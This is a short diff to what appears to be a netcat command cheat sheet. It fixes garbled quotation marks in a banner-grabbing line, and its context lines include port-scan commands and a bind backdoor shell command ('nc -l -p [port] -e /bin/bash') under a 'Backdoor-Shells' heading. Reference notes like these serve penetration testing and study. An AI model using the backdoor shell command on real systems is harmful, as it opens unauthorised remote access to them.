@@ -128,7 +128,7 @@ nc -zv hostname.com 80 84 # scan ports
 nc -zv site.com 80-84 # scan ports
 
 Netcat-Banner
-echo â€œâ€ | nc -zv -wl [host] [port range] grab banner
+echo "" | nc -zv -wl [host] [port range] grab banner
 
 Netcat-Backdoor-Shells
 nc -l -p [port] -e /bin/bash
